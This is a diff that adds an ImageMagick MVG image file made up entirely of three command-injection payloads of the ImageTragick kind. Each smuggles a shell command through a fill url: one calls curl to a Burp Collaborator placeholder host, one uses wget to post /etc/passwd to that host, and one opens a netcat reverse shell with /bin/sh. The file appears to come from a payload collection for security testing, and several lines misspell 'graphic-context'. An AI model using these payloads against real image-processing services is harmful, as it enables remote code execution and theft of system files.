@@ -1,0 +1,14 @@
+push graphic-xontext
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg "|curl burpcollablink")'
+pop graphic-context
+
+push graphic-xontext
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg "|wget --post-file /etc/passwd burpcollablink")'
+pop graphic-context
+
+push graphic-xontext
+viewbox 0 0 640 480
+fill 'url(https://example.com/someimage.jpg "|nc -e /bin/sh 127.0.0.1 "4544)'
+pop graphic-context
